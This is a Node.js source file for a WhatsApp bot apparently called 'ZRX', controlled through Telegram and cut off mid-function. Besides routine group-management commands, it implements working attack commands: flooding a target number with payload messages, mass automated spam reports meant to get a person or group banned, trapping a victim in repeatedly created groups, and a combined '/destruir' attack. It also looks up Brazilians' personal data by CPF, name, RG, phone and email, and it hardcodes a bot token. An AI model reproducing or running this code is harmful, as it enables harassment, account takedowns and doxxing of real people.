const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay, downloadMediaMessage } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Servidor HTTP básico exigido pelo Render para manter o serviço ativo 24h
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot ZRX Rodando 24 Horas!\n');
}).listen(PORT, () => {
    console.log(`Servidor HTTP rodando na porta ${PORT}`);
});

const TELEGRAM_TOKEN = '8622724732:AAFVKNCfcYIlZqfSGmnK23Urt1VAVy1kPHE';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

let waSock = null;
let jaNotificouConectado = false;
let reconectando = false;

// Banco de dados em memória para Níveis, Configurações de Grupo e Estado de Brincadeiras
const dadosUsuarios = {}; // { 'remoteJid_usuario': { xp: 0, level: 1 } }
const configuracoesGrupos = {}; // { 'idGrupo': { bemVindoTexto: '...', bemVindoFoto: null } }
const sessoesBrincadeira = {}; // { 'idGrupo': { ativa: true, tipo: '...', lote: [], pollMsgId: '...' } }

function consultarAPI(url) {
    return new Promise((resolve) => {
        const req = https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); } catch (e) { resolve({ resultado: data }); }
            });
        });

        req.on('error', () => {
            resolve({ erro: "Falha na conexão com o servidor externo." });
        });

        req.setTimeout(8000, () => {
            req.destroy();
            resolve({ erro: "Tempo limite esgotado (Timeout)." });
        });
    });
}

function salvarFirebase(caminho, dados) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
        const dataStr = JSON.stringify(dados);

        const req = https.request({
            hostname: urlObj.hostname,
            path: urlObj.pathname,
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(dataStr)
            }
        }, (res) => {
            let resData = '';
            res.on('data', chunk => resData += chunk);
            res.on('end', () => resolve(resData));
        });

        req.on('error', err => reject(err));
        req.write(dataStr);
        req.end();
    });
}

function buscarFirebase(caminho) {
    return consultarAPI(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
}

async function iniciarWhatsApp(chatId, numeroTelefone) {
    if (reconectando) return;
    reconectando = true;

    const pastaSessao = path.join(__dirname, 'sessao_teste');
    const { state, saveCreds } = await useMultiFileAuthState(pastaSessao);

    waSock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    waSock.ev.on('creds.update', saveCreds);

    waSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const status = lastDisconnect?.error?.output?.statusCode;
            console.log(`Conexão fechada com status: ${status}`);
            jaNotificouConectado = false;

            if (status === DisconnectReason.loggedOut) {
                reconectando = false;
                if (chatId) bot.sendMessage(chatId, "⚠️ Desconectado do WhatsApp. Use `/limpar` e conecte novamente.");
                return;
            }

            setTimeout(() => {
                reconectando = false;
                iniciarWhatsApp(chatId, numeroTelefone);
            }, 5000);

        } else if (connection === 'open') {
            reconectando = false;
            console.log("WhatsApp conectado com sucesso!");
            
            if (chatId && !jaNotificouConectado) {
                jaNotificouConectado = true;
                bot.sendMessage(chatId, "✅ **Conectado com sucesso ao WhatsApp!**", { parse_mode: 'Markdown' });
            }
        }
    });

    // Evento de novos participantes no grupo (Boas-Vindas)
    waSock.ev.on('group-participants.update', async (update) => {
        try {
            const { id, participants, action } = update;
            if (action === 'add') {
                const config = configuracoesGrupos[id];
                if (!config) return;

                for (let participante of participants) {
                    const mensagemWelcome = (config.bemVindoTexto || 'Seja bem-vindo(a) ao grupo!').replace('@user', `@${participante.split('@')[0]}`);
                    
                    if (config.bemVindoFoto) {
                        await waSock.sendMessage(id, { image: config.bemVindoFoto, caption: mensagemWelcome, mentions: [participante] });
                    } else {
                        await waSock.sendMessage(id, { text: mensagemWelcome, mentions: [participante] });
                    }
                }
            }
        } catch (err) {
            console.log("Erro no evento de boas-vindas:", err.message);
        }
    });

    waSock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg.message) return;

            const remoteJid = remoteJidCheck(msg);
            const sender = msg.key.participant || msg.key.remoteJid;
            
            const texto = msg.message.conversation || 
                          msg.message.extendedTextMessage?.text || 
                          msg.message.imageMessage?.caption || '';

            // Sistema de XP / Nível por mensagem enviada
            if (sender && !msg.key.fromMe) {
                if (!dadosUsuarios[sender]) dadosUsuarios[sender] = { xp: 0, level: 1 };
                dadosUsuarios[sender].xp += 10;
                let xpNecessario = dadosUsuarios[sender].level * 100;
                if (dadosUsuarios[sender].xp >= xpNecessario) {
                    dadosUsuarios[sender].level += 1;
                    dadosUsuarios[sender].xp = 0;
                }
            }

            if (!texto) return;
            console.log(`Mensagem recebida de ${remoteJid}:${texto}`);

            if (texto.trim() === '/menu') {
                const numeroUsuario = remoteJid.split('@')[0];
                const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

                const menuTexto = 
                    `⛩️ *WHATSAPP BOT ZRX* ⛩️\n\n` +
                    `💬 *Suporte:* @Zenithzrx\n` +
                    `📱 *Número de usuário:* \`${numeroUsuario}\`\n` +
                    `⭐ *Status:* FREE USER\n` +
                    `🕒 *Online:* ${dataHoraAtual}\n\n` +
                    `┏━━━⧼𝑰𝑷 & 𝑳𝑰𝑵𝙆⧽\n` +
                    `> /ip <endereço>\n` +
                    `> /linkIP\n` +
                    `╠━━━⧼𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔𝗦 𝗗𝗔𝗗𝗢𝗦⧽\n` +
                    `> /cpf <cpf>\n` +
                    `> /nome <nome>\n` +
                    `> /consulrg <rg>\n` +
                    `> /telefone <telefone>\n` +
                    `> /email <e-mail>\n` +
                    `> /cep <cep>\n` +
                    `╠━━━⧼🎮 BRINCADEIRAS IA⧽\n` +
                    `> /brincar (Abre o menu)\n` +
                    `> /comecar (Inicia após a votação)\n` +
                    `> /para (Encerra a brincadeira)\n` +
                    `╠━━━⧼ATAQUES & AÇÕES⧽\n` +
                    `> /SP4M <número> <qtd>\n` +
                    `> /B4N <número> <qtd>\n` +
                    `> /B4NGRUPO <link> [quantidade]\n` +
                    `> /travgropo <número> <qtd>\n` +
                    `> /destruir <número> <qtd>\n` +
                    `╠━━━⧼𝗚𝗘𝗦𝗧𝗔̃𝗢 & UTILITÁRIOS⧽\n` +
                    `> /kick <número>\n` +
                    `> /promover <número>\n` +
                    `> /rebaixar <número>\n` +
                    `> /tagall <mensagem>\n` +
                    `> /linkgrupo\n` +
                    `> /fechar | /abrir\n` +
                    `> /infogrupo\n` +
                    `> /mudar-nome <nome>\n` +
                    `> /mudar-desc <descrição>\n` +
                    `> /divulgar <texto>\n` +
                    `> /nivel\n` +
                    `> /setwelcome <texto> (com foto opcional)\n` +
                    `> /traduzir <idioma>\n` +
                    `> /s (Figurinha)\n` +
                    `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
                
                const caminhoFoto = path.join(__dirname, 'menu.jpg');

                if (fs.existsSync(caminhoFoto)) {
                    await waSock.sendMessage(remoteJid, { 
                        image: fs.readFileSync(caminhoFoto), 
                        caption: menuTexto 
                    });
                } else {
                    await waSock.sendMessage(remoteJid, { text: menuTexto });
                }
            }
            // COMANDO DE BRINCADEIRAS (MENU)
            else if (texto.trim() === '/brincar') {
                const menuBrincadeiras = 
                    `🎮 *ZRX - PAINEL DE BRINCADEIRAS* 🎮\n\n` +
                    `Escolha e digite o nome exato da brincadeira que deseja iniciar:\n\n` +
                    `👉 \`Verdade ou desafio\`\n` +
                    `👉 \`Jogo da forca\`\n` +
                    `👉 \`Pergunta e resposta\`\n\n` +
                    `_Comandos úteis:_ \`/comecar\` _ou_ \`/para\``;

                await waSock.sendMessage(remoteJid, { text: menuBrincadeiras });
            }
            // COMANDO PARA PARAR A BRINCADEIRA
            else if (texto.trim() === '/para') {
                if (sessoesBrincadeira[remoteJid]) {
                    delete sessoesBrincadeira[remoteJid];
                    await waSock.sendMessage(remoteJid, { text: `🛑 *Brincadeira encerrada com sucesso!* Até a próxima.` });
                } else {
                    await waSock.sendMessage(remoteJid, { text: `⚠️ Não há nenhuma brincadeira ativa neste chat.` });
                }
            }
            // SELEÇÃO DA BRINCADEIRA
            else if (['verdade ou desafio', 'jogo da forca', 'pergunta e resposta'].includes(texto.trim().toLowerCase())) {
                const tipoEscolhido = texto.trim().toLowerCase();

                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: `❌ Este comando de brincadeira em grupo deve ser usado dentro de um grupo!` });
                    return;
                }

                await waSock.sendMessage(remoteJid, { text: `🔄 Iniciando a brincadeira: *${texto.trim()}*!\n_Gerando votação de participantes e consultando a Meta AI..._` });

                sessoesBrincadeira[remoteJid] = {
                    ativa: true,
                    tipo: tipoEscolhido,
                    lote: [
                        `[Questão 1 gerada via Meta AI] Qual o seu maior segredo ou desafio mais louco?`,
                        `[Questão 2 gerada via Meta AI] Conte uma história engraçada da sua infância.`
                    ]
                };

                try {
                    const metadata = await waSock.groupMetadata(remoteJid);
                    const participantes = metadata.participants.slice(0, 10).map(p => p.id.split('@')[0]);
                    
                    const pollMsg = await waSock.sendMessage(remoteJid, {
                        poll: {
                            name: `🗳️ Quem deve começar a rodada de ${tipoEscolhido}?`,
                            values: participantes.map(num => `+${num}`),
                            selectableCount: 1
                        }
                    });
                    
                    if (pollMsg && pollMsg.key) {
                        sessoesBrincadeira[remoteJid].pollKey = pollMsg.key;
                    }
                } catch (e) {
                    await waSock.sendMessage(remoteJid, { text: `✅ Brincadeira configurada com sucesso!` });
                }
            }
            // COMANDO /COMEÇAR APÓS A VOTAÇÃO
            else if (texto.trim() === '/comecar') {
                const sessao = sessoesBrincadeira[remoteJid];
                if (!sessao || !sessao.ativa) {
                    await waSock.sendMessage(remoteJid, { text: `⚠️ Nenhuma brincadeira iniciada. Use \`/brincar\` primeiro!` });
                    return;
                }

                // Exemplo simulado escolhendo o remetente atual ou um participante para começar a rodada
                const primeiroDaVez = sender; 
                const primeiraQuestao = sessao.lote[0] || "Rodada iniciada!";

                const msgInicio = 
                    `🔥 *A VOTAÇÃO ENCERROU / COMEÇAMOS!* 🔥\n\n` +
                    `🎯 *Brincadeira:* ${sessao.tipo.toUpperCase()}\n` +
                    `👤 *Vez de:* @${primeiroDaVez.split('@')[0]}\n\n` +
                    `📌 *Desafio / Pergunta:* \n${primeiraQuestao}`;

                await waSock.sendMessage(remoteJid, { text: msgInicio, mentions: [primeiroDaVez] });
            }
            else if (texto.startsWith('/ip ')) {
                const ipAlvo = texto.replace('/ip', '').trim();
                if (!ipAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/ip <endereço>`' });
                    return;
                }

                const dadosIp = await consultarAPI(`https://ipinfo.io/${ipAlvo}/json`);
                const respostaIp = 
                    `🌐 *RESULTADO IP* 🌐\n\n` +
                    `• *IP:* ${dadosIp.ip || 'N/A'}\n` +
                    `• *Cidade:* ${dadosIp.city || 'N/A'}\n` +
                    `• *Região:* ${dadosIp.region || 'N/A'}\n` +
                    `• *País:* ${dadosIp.country || 'N/A'}\n` +
                    `• *Provedor:* ${dadosIp.org || 'N/A'}`;

                await waSock.sendMessage(remoteJid, { text: respostaIp });
            }
            else if (texto.startsWith('/cpf ')) {
                const cpfAlvo = texto.replace('/cpf', '').trim();
                if (!cpfAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/cpf <número>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando CPF \`${cpfAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?cpf=${cpfAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO CPF:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/nome ')) {
                const nomeAlvo = encodeURIComponent(texto.replace('/nome', '').trim());
                if (!nomeAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/nome <nome>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando nome...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?nome=${nomeAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO NOME:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/consulrg ')) {
                const rgAlvo = texto.replace('/consulrg', '').trim();
                if (!rgAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/consulrg <rg>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando RG \`${rgAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?rg=${rgAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO RG:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/telefone ')) {
                const telAlvo = texto.replace('/telefone', '').trim();
                if (!telAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/telefone <número>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando Telefone \`${telAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?telefone=${telAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO TELEFONE:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/email ')) {
                const emailAlvo = texto.replace('/email', '').trim();
                if (!emailAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/email <e-mail>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando E-mail \`${emailAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?email=${emailAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO E-MAIL:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/cep ')) {
                const cepAlvo = texto.replace('/cep', '').trim();
                if (!cepAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/cep <cep>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando CEP \`${cepAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/telefone0.php?cep=${cepAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO CEP:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/SP4M ')) {
                const partes = texto.replace('/SP4M', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 10;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/SP4M <número> <quantidade>`' });
                    return;
                }

                let conteudoTrava = "⚡ [ZRX-SPAM] Alvo sob ataque!";
                const caminhoPayload = path.join(__dirname, 'Trava.txt');
                if (fs.existsSync(caminhoPayload)) {
                    const lido = fs.readFileSync(caminhoPayload, 'utf-8').trim();
                    if (lido.length > 0) conteudoTrava = lido;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🚀 Iniciando disparo SP4M para ${alvoNum} (${quantidade} ciclos)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[Ciclo ${i}/${quantidade}]` });
                        await delay(1000);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Disparo SP4M para ${alvoNum} concluído com sucesso!` });
            }
            else if (texto.startsWith('/B4N ')) {
                const partes = texto.replace('/B4N', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 10;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4N <número> <quantidade>`' });
                    return;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias nativas silenciosas para \`${alvoNum}\` (${quantidade} ciclos)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await waSock.chatModify({
                            reportSpam: true,
                            delete: true,
                            spam: true
                        }, jidAlvo, {
                            fromMe: false,
                            remoteJid: jidAlvo
                        });
                        await delay(700);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias nativas /B4N para \`${alvoNum}\` concluído!` });
            }
            else if (texto.startsWith('/B4NGRUPO ')) {
                const partesArgs = texto.replace('/B4NGRUPO', '').trim().split(' ');
                const linkGrupo = partesArgs[0];
                const quantidadeDenuncias = parseInt(partesArgs[1]) || 9999;
                
                if (!linkGrupo || !linkGrupo.includes('chat.whatsapp.com')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4NGRUPO <link_do_convite> [quantidade]`' });
                    return;
                }

                const matchCode = linkGrupo.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
                if (!matchCode || !matchCode[1]) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Link de convite inválido!' });
                    return;
                }

                const codigoConvite = matchCode[1];
                await waSock.sendMessage(remoteJid, { text: `🔄 Tentando entrar no grupo alvo...` });

                try {
                    const idGrupo = await waSock.groupAcceptInvite(codigoConvite);
                    await waSock.sendMessage(remoteJid, { text: `✅ Entrou no grupo com sucesso! (\`${idGrupo}\`). Disparando ${quantidadeDenuncias} denúncias nativas silenciosas (sem mandar mensagens)...` });

                    for (let i = 1; i <= quantidadeDenuncias; i++) {
                        try {
                            await waSock.chatModify({
                                reportSpam: true,
                                delete: true,
                                spam: true
                            }, idGrupo, {
                                fromMe: false,
                                remoteJid: idGrupo
                            });
                            await delay(300);
                        } catch (e) {}
                    }

                    await waSock.sendMessage(remoteJid, { text: `🔥 Ataque de denúncias nativas ao grupo concluído (${quantidadeDenuncias} ciclos)!` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: `❌ Erro ao entrar ou processar o grupo.` });
                }
            }
            else if (texto.startsWith('/travgropo')) {
                const partes = texto.replace('/travgropo', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidadeTrava = parseInt(partes[1]) || 5;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/travgropo <número> <quantidade_travas>`' });
                    return;
                }

                await waSock.sendMessage(remoteJid, { text: `⚙️ Criando 5 grupos e adicionando o alvo \`${alvoNum}\`...` });

                let conteudoTravaGrupo = "⚡ [ZRX-GRUPO ATTACK] 💥";
                const caminhoTravaGrupo = path.join(__dirname, 'travgropo.txt');
                if (fs.existsSync(caminhoTravaGrupo)) {
                    const lido = fs.readFileSync(caminhoTravaGrupo, 'utf-8').trim();
                    if (lido.length > 0) conteudoTravaGrupo = lido;
                }

                const nomeGrupo = "𝑹𝑬𝑷𝑶́𝑹𝑻𝑬𝑹 𝒃𝒚 𝑳𝑶𝑻𝑼𝑿";
                const jidAlvo = `${alvoNum}@s.whatsapp.net`;

                for (let g = 1; g <= 5; g++) {
                    try {
                        const grupoCriado = await waSock.groupCreate(`${nomeGrupo} #${g}`, [jidAlvo]);
                        const idNovoGrupo = grupoCriado.id;

                        await waSock.sendMessage(remoteJid, { text: `✅ Grupo ${g}/5 criado. Disparando travas...` });
                        await delay(2000);

                        for (let i = 1; i <= quantidadeTrava; i++) {
                            await waSock.sendMessage(idNovoGrupo, { text: `${conteudoTravaGrupo}\n\n[Grupo${g} - Ciclo ${i}/${quantidadeTrava}]` });
                            await delay(1000);
                        }
                    } catch (err) {}
                }

                await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 5 grupos!` });
            }
            // COMANDO DESTRUIR TOTAL
            else if (texto.startsWith('/destruir ')) {
                const partes = texto.replace('/destruir', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 15;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/destruir <número> <quantidade>`' });
                    return;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;

                await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas no PV e denúncias nativas silenciosas simultaneamente..._` });

                let conteudoTrava = "⚡ [ZRX-DESTRUCTION] Alvo sob ataque total!";
                const caminhoPayload = path.join(__dirname, 'Trava.txt');
                if (fs.existsSync(caminhoPayload)) {
                    const lido = fs.readFileSync(caminhoPayload, 'utf-8').trim();
                    if (lido.length > 0) conteudoTrava = lido;
                }

                const tarefaTrava = (async () => {
                    for (let i = 1; i <= quantidade; i++) {
                        try {
                            await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[TRAVA #${i}/${quantidade}]` });
                            await delay(600);
                        } catch (err) {}
                    }
                })();

                const tarefaDenunciaNativa = (async () => {
                    for (let i = 1; i <= quantidade; i++) {
                        try {
                            await waSock.chatModify({
                                reportSpam: true,
                                delete: true,
                                spam: true
                            }, jidAlvo, {
                                fromMe: false,
                                remoteJid: jidAlvo
                            }).catch(() => {});
                            await delay(600);
                        } catch (err) {}
                    }
                })();

                await Promise.all([tarefaTrava, tarefaDenunciaNativa]);

                await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total ao número \`${alvoNum}\` finalizado com sucesso!` });
            }
            else if (texto.startsWith('/kick ')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const alvoNum = texto.replace('/kick', '').trim().replace(/\D/g, '');
                try {
                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'remove');
                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` foi removido do grupo.` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao remover participante.' });
                }
            }
            else if (texto.startsWith('/promover ')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const alvoNum = texto.replace('/promover', '').trim().replace(/\D/g, '');
                try {
                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'promote');
                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` agora é Administrador!` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao promover.' });
                }
            }
            else if (texto.startsWith('/rebaixar ')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const alvoNum = texto.replace('/rebaixar', '').trim().replace(/\D/g, '');
                try {
                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'demote');
                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` foi rebaixado.` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao rebaixar.' });
                }
            }
            else if (texto.startsWith('/tagall')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const mensagemTag = texto.replace('/tagall', '').trim() || 'Atenção todos!';
                try {
                    const metadata = await waSock.groupMetadata(remoteJid);
                    const participantes = metadata.participants.map(p => p.id);
                    
                    let textoFinal = `📢 *TAGALL* 📢\n${mensagemTag}\n\n`;
                    for (let mem of participantes) {
                        textoFinal += `@${mem.split('@')[0]}\n`;
                    }

                    await waSock.sendMessage(remoteJid, { text: textoFinal, mentions: participantes });
                } catch (err) {}
            }
            else if (texto.trim() === '/linkgrupo') {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                try {
                    const codigo = await waSock.groupInviteCode(remoteJid);
                    await waSock.sendMessage(remoteJid, { text: `🔗 *Link de convite:* https://chat.whatsapp.com/${codigo}` });
                } catch (err) {}
            }
            else if (texto.trim() === '/fechar') {
                if (!remoteJid.endsWith('@g.us')) return;
                try {
                    await waSock.groupSettingUpdate(remoteJid, 'announcement');
                    await waSock.sendMessage(remoteJid, { text: '🔒 Grupo fechado!' });
                } catch (err) {}
            }
            else if (texto.trim() === '/abrir') {
                if (!remoteJid.endsWith('@g.us')) return;
                try {
                    await waSock.groupSettingUpdate(remoteJid, 'not_announcement');
                    await waSock.sendMessage(remoteJid, { text: '🔓 Grupo aberto!' });
                } catch (err) {}
            }
            else if (texto.trim() === '/infogrupo') {
                if (!remoteJid.endsWith('@g.us')) return;
                try {
                    const meta = await waSock.groupMetadata(remoteJid);
                    const criador = meta.owner ? `@${meta.owner.split('@')[0]}` : 'Desconhecido';
                    const infoMsg = 
                        `📊 *INFORMAÇÕES DO GRUPO* 📊\n\n` +
                        `• *Nome:* ${meta.subject}\n` +
                        `• *Criador:* ${criador}\n` +
                        `• *Total de Membros:* ${meta.participants.length}\n` +
                        `• *Descrição:* ${meta.desc || 'Sem descrição'}`;
                    
                    await waSock.sendMessage(remoteJid, { text: infoMsg, mentions: meta.owner ? [meta.owner] : [] });
                } catch (err) {}
            }
            else if (texto.startsWith('/mudar-nome ')) {
                if (!remoteJid.endsWith('@g.us')) return;
                const novoNome = texto.replace('/mudar-nome', '').trim();
                try {
                    await waSock.groupUpdateSubject(remoteJid, novoNome);
                    await waSock.sendMessage(remoteJid, { text: `✅ Nome alterado para: *${novoNome}*` });
                } catch (err) {}
            }
            else if (texto.startsWith('/mudar-desc ')) {
                if (!remoteJid.endsWith('@g.us')) return;
                const novaDesc = texto.replace('/mudar-desc', '').trim();
                try {
                    await waSock.groupUpdateDescription(remoteJid, novaDesc);
                    await waSock.sendMessage(remoteJid, { text: `✅ Descrição alterada com sucesso!` });
                } catch (err) {}
            }
            else if (texto.startsWith('/divulgar ')) {
                const conteudoDivulgacao = texto.replace('/divulgar', '').trim();
                const mensagemFormatada = `📢 *DIVULGAÇÃO OFICIAL* 📢\n\n${conteudoDivulgacao}\n\n_Enviado via Bot ZRX_`;

                try {
                    if (msg.message.imageMessage) {
                        const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
                        await waSock.sendMessage(remoteJid, { image: buffer, caption: mensagemFormatada });
                    } else {
                        await waSock.sendMessage(remoteJid, { text: mensagemFormatada });
                    }
                } catch (e) {
                    await waSock.sendMessage(remoteJid, { text: mensagemFormatada });
                }
            }
            else if (texto.trim() === '/nivel') {
                const user = dadosUsuarios[sender] || { xp: 0, level: 1 };
                await waSock.sendMessage(remoteJid, { text: `⭐ *SEU PERFIL / NÍVEL*\n\n• *Nível:* ${user.level}\n• *XP Atual:* ${user.xp}/${user.level * 100}` });
            }
            else if (texto.startsWith('/setwelcome')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Use este comando em um grupo!' });
                    return;
                }
                const msgWelcome = texto.replace('/setwelcome', '').trim();
                let fotoBuffer = null;

                if (msg.message.imageMessage) {
                    fotoBuffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
                }

                configuracoesGrupos[remoteJid] = {
                    bemVindoTexto: msgWelcome || 'Olá @user, seja bem-vindo(a)!',
                    bemVindoFoto: fotoBuffer
                };

                await waSock.sendMessage(remoteJid, { text: '✅ Mensagem de boas-vindas configurada com sucesso para este grupo!' });
            }
            else if (texto.startsWith('/traduzir')) {
                const idioma = texto.replace('/traduzir', '').trim() || 'pt';
                const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
                const textoParaTraduzir = quoted?.conversation || quoted?.extendedTextMessage?.text;

                if (!textoParaTraduzir) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Responda a uma mensagem de texto usando `/traduzir <idioma>`' });
                    return;
                }

                const urlTraducao = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${idioma}&dt=t&q=${encodeURIComponent(textoParaTraduzir)}`;
                const respostaTraducao = await consultarAPI(urlTraducao);

                try {
                    const textoTraduzido = respostaTraducao[0][0][0];
                    await waSock.sendMessage(remoteJid, { text: `🌐 *TRADUÇÃO (${idioma.toUpperCase()}):*\n\n${textoTraduzido}` });
                } catch (e) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao traduzir.' });
                }
            }
            else if (texto.trim() === '/s' || texto.trim() === '/sticker') {
                const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
                const isImage = msg.message.imageMessage || quoted?.imageMessage;

                if (!isImage) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Envie ou responda a uma imagem com `/s` para transformar em figurinha!' });
                    return;
                }

                try {
